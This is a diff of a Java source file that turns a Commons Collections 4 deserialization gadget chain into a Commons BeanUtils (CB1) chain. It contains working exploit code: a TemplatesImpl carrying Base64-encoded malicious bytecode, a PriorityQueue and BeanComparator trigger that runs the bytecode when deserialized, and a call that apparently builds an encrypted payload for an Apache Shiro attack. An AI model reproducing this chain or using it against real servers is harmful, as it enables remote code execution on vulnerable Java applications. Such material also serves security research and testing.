@@ -1,16 +1,10 @@
-package org.example;
+package org.example.CB;
 
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import org.apache.commons.collections4.Transformer;
-import org.apache.commons.collections4.functors.ChainedTransformer;
-import org.apache.commons.collections4.functors.ConstantTransformer;
-import org.apache.commons.collections4.functors.InstantiateTransformer;
-import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.beanutils.BeanComparator;
+import org.example.ShiroAttack.EncPayload;
 
-import javax.xml.transform.Templates;
-import java.io.*;
 import java.lang.reflect.Field;
 import java.util.Base64;
 import java.util.PriorityQueue;
@@ -20,24 +14,22 @@ import java.util.PriorityQueue;
 *  ->PriorityQueue.heapify()
 *   ->PriorityQueue.siftDown()
 *    ->PriorityQueue.siftDownUsingComparator()
-*     ->TransformingComparator.compare()
-*      ->ChainedTransformer.transform()
-*       ->InstantiateTransformer.transform()
-*        ->TrAXFilter.TrAXFilter()
-*         ->TemplatesImpl.newTransformer()
-*          ->TemplatesImpl.getTransletInstance()
-*           ->TemplatesImpl.defineTransletClasses()
-*            ->TemplatesImpl$TransletClassLoader.defineClass()
+*     ->BeanComparator.compare()
+*      ->PropertyUtils.getProperty("outputProperties")
+*       ->TemplatesImpl.getOutputProperties()
+*        ->TemplatesImpl.newTransformer()
+*         ->TemplatesImpl.getTransletInstance()
+*          ->TemplatesImpl.defineTransletClasses()
+*           ->TemplatesImpl$TransletClassLoader.defineClass()
 * */
 
-public class CC4 {
-    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
-        Field field = obj.getClass().getDeclaredField(fieldName);
-        field.setAccessible(true);
-        field.set(obj, value);
+public class CB1 {
+    public static void setFieldValue(Object o, String fieldName, Object newVal) throws Exception {
+        Field f = o.getClass().getDeclaredField(fieldName);
+        f.setAccessible(true);
+        f.set(o,newVal);
     }
-
-    public static void main(String[] args) throws Exception {
+    public static void main(String[] args) throws Exception{
         byte[] CalcCode = Base64.getDecoder().decode(
                 "yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEA" +
                         "CXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RP" +
@@ -59,21 +51,21 @@ public class CC4 {
         setFieldValue(calcTemp, "_bytecodes", new byte[][] {CalcCode});
         setFieldValue(calcTemp, "_name", "CalcTemplatesImpl");
         setFieldValue(calcTemp, "_tfactory", new TransformerFactoryImpl());
-        Transformer[] transformers = new Transformer[]{
-                new ConstantTransformer(TrAXFilter.class),
-                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{calcTemp})
-        };
-        ChainedTransformer transformerChain = new ChainedTransformer(transformers);
-        PriorityQueue<Object> queue = new PriorityQueue<>(2,new TransformingComparator(transformerChain));
+
+        BeanComparator comparator = new BeanComparator();
+        PriorityQueue queue = new PriorityQueue<>(2,comparator);
         queue.add("3xsh0re");
-        queue.add("CC-4");
+        queue.add("CB-1");
+
+        setFieldValue(comparator,"property","outputProperties");
+        setFieldValue(queue,"queue",new Object[]{calcTemp,calcTemp});
 
         // 测试
-        ByteArrayOutputStream barr = new ByteArrayOutputStream();
-        ObjectOutputStream oos = new ObjectOutputStream(barr);
-        oos.writeObject(queue);
-        oos.close();
-        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
-        ois.readObject();
+//        SerUtils.serialize(queue,"CB1.bin");
+//        SerUtils.unserialize("CB1.bin");
+
+        EncPayload.getPOC("CB1.bin");
     }
+
+
 }
